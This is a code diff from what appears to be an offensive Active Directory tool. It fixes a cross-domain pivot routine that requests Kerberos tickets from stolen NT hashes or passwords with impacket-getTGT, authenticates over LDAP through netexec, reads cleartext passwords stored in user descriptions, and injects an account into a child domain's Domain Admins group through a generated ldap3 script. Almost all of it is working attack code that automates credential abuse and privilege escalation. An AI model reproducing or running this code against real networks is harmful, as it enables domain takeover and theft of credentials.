@@ -218,7 +218,13 @@ func RunCrossDomainPivot(ctx context.Context, state *core.ADState, creds []credW
 				utils.DimStyle.Render(targetHost))
 
 			// Step 1: Generate Kerberos TGT.
-			ccachePath, krbErr := getKrbTGT(ctx, src)
+			// impacket-getTGT needs -dc-ip to bypass DNS (it does not use KRB5_CONFIG).
+			// Look up the DC IP for the source (parent) domain.
+			dcIP := ""
+			if dcs, ok := dcsByDomain[strings.ToLower(src.Domain)]; ok && len(dcs) > 0 {
+				dcIP = dcs[0].IP
+			}
+			ccachePath, krbErr := getKrbTGT(ctx, src, dcIP)
 			if krbErr != nil {
 				fmt.Printf("    \u2717 TGT generation failed: %v\n", krbErr)
 				continue
@@ -250,7 +256,7 @@ func RunCrossDomainPivot(ctx context.Context, state *core.ADState, creds []credW
 			// Note: no -d/-u flags — --use-kcache reads the identity from
 			// the ccache file. Passing -d/-u would override the realm and
 			// trigger KDC_ERR_WRONG_REALM.
-			stdout, krbOK := runNxcWithKcache(ctx, ccachePath, krb5Path, targetHost)
+			stdout, krbOK := runNxcWithKcache(ctx, ccachePath, krb5Path, tgt.IP)
 			if !krbOK {
 				fmt.Printf("    \u2717 LDAP Kerberos auth failed as %s\\%s\n", src.Domain, src.Username)
 				continue
@@ -272,7 +278,7 @@ func RunCrossDomainPivot(ctx context.Context, state *core.ADState, creds []credW
 				fmt.Printf("    \U0001f511 Cleartext: %s:%s\n",
 					utils.FoundStyle.Render(samName), password)
 
-				if injectViaPythonWithKrb(ctx, ccachePath, krb5Path, targetHost, childDomain, samName) {
+				if injectViaPythonWithKrb(ctx, ccachePath, krb5Path, targetHost, childDomain, samName, tgt.IP) {
 					fmt.Printf("    \u2713 %s promoted to %s Domain Admins\n",
 						utils.FoundStyle.Render(samName), childDomain)
 				} else {
@@ -301,7 +307,8 @@ func RunCrossDomainPivot(ctx context.Context, state *core.ADState, creds []credW
 // Hash format: LM:NT (e.g. "aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e").
 // When only the NT hash is available (32 hex chars), the empty LM hash is
 // prepended automatically.
-func getKrbTGT(ctx context.Context, src credWithHost) (string, error) {
+// dcIP is passed as -dc-ip to bypass DNS (impacket does not use KRB5_CONFIG).
+func getKrbTGT(ctx context.Context, src credWithHost, dcIP string) (string, error) {
 	ccachePath := filepath.Join(os.TempDir(), fmt.Sprintf("adpk_%s_%d.ccache",
 		src.Username, time.Now().UnixNano()))
 
@@ -320,6 +327,9 @@ func getKrbTGT(ctx context.Context, src credWithHost) (string, error) {
 		args = append(args, userPrincipal)
 	} else {
 		return "", fmt.Errorf("no hash or password for %s\\%s", src.Domain, src.Username)
+	}
+	if dcIP != "" {
+		args = append(args, "-dc-ip", dcIP)
 	}
 
 	impCmd := exec.CommandContext(ctx, "impacket-getTGT", args...)
@@ -451,12 +461,12 @@ func parseCleartextFromDescOutput(stdout string) map[string]string {
 //
 // The user parameter is intentionally omitted — for SASL/Kerberos the
 // Kerberos ticket in the ccache identifies the calling principal.
-func injectViaPythonWithKrb(ctx context.Context, ccachePath, krb5Path, targetHost, tgtDomain, samAccountName string) bool {
+func injectViaPythonWithKrb(ctx context.Context, ccachePath, krb5Path, targetHost, tgtDomain, samAccountName, targetIP string) bool {
 	baseDN := domainToBaseDN(tgtDomain)
 
 	pyScript := fmt.Sprintf(`import ldap3, sys
 server = ldap3.Server('%s', port=389, get_info=ldap3.ALL)
-conn = ldap3.Connection(server, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS)
+conn = ldap3.Connection(server, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS, sasl_credentials=('%s',))
 if not conn.bind():
     print("BIND_FAIL")
     sys.exit(1)
@@ -473,7 +483,7 @@ if conn.result['result'] == 0:
 else:
     print("MODIFY_FAIL:" + str(conn.result))
 conn.unbind()
-`, targetHost, baseDN, samAccountName, samAccountName)
+`, targetIP, targetHost, baseDN, samAccountName, samAccountName)
 
 	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("adpk_ldap_%d.py", time.Now().UnixNano()))
 	if err := os.WriteFile(tmpFile, []byte(pyScript), 0600); err != nil {
